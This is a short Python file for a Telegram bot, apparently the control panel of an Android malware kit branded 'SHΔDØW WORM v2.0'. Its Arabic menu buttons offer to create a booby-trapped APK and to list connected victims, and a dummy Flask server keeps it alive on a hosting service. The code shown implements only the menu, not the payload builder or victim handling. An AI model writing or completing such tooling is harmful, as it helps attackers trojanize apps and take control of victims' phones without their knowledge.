import os
import telebot
from telebot import types
from flask import Flask
import threading

# إعداد خادم وهمي لإرضاء Render
app = Flask('')
@app.route('/')
def home():
    return "Server is Running!"

def run_flask():
    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 5000)))

# جلب التوكن
BOT_TOKEN = os.environ.get('BOT_TOKEN')
bot = telebot.TeleBot(BOT_TOKEN)

@bot.message_handler(commands=['start'])
def start(message):
    markup = types.InlineKeyboardMarkup(row_width=1)
    btn1 = types.InlineKeyboardButton("🛠️ إنشاء تطبيق ملغم (APK)", callback_data='create_apk')
    btn2 = types.InlineKeyboardButton("📱 قائمة الضحايا المتصلين", callback_data='list_victims')
    markup.add(btn1, btn2)
    bot.send_message(message.chat.id, "💀 **SHΔDØW WORM v2.0** المتصل الآن..", reply_markup=markup, parse_mode='Markdown')

# تشغيل الخادم الوهمي في خيط منفصل (Thread)
threading.Thread(target=run_flask).start()

# تشغيل البوت
if __name__ == "__main__":
    bot.infinity_polling()
